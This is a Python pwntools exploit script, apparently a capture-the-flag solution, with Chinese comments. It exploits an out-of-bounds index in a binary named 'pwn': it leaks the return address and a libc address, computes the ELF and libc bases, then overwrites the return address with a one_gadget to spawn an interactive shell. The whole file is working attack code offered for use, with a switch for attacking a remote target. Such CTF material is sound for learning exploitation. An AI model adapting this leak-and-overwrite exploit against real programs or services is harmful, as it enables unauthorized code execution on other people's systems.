# -*- coding: utf-8 -*-
from pwn import*
def leak(index):
	addr = ""
	for i in range(8):
		p.sendlineafter('index\n',str(index+i))
		p.recvuntil("now value(hex) ")
		data = int(p.recvuntil("\n",drop=True),16)#
		if data > 300:#处理特别的数据
			data = data - 0xffffff00
		p.recvuntil("input new value\n")
		p.sendline(str(data))
		addr += chr(data)#八个字符相加构成新的字符串
	addr = u64(addr)#变成地址形式
	return addr

def change(index, addr):
	for i in range(8):
		p.sendlineafter('index\n',str(index+i))
		p.recvuntil("now value(hex) ")
		data = p.recvn(1)
		p.recvuntil("input new value\n")
		p.sendline(str(addr))
		addr = addr >> 8#每次addr向右移动2位

local = 1
if local:         #if else 使用选择本地或者远程
	p = process('./pwn')
else:
	p = remote()
p.sendlineafter('name:','cxk')
retaddr = leak(0x158) #数组起始位置到rbp0x150+ebp自身八个字节的长度，sub_b35()的返还地址
elf_base = retaddr - 0xb11
print '[*] elf_base :',hex(elf_base)
addrs = leak(0x160+0x118)#泄露一个libc函数的真实地址
libc_base = addrs - 0x20830#减去该函数在libc文件的偏移得到libc_base
one_gadget = libc_base + 0xf02a4#通过libc_base加上one_gadget在libc中的偏移得到程序中one_gadget的真实地址
print '[*] one_gadget :',hex(one_gadget)
print '[*] libc_base :',hex(libc_base)
change(0x158,one_gadget)
p.sendline("no")
p.sendline("a")
p.interactive()
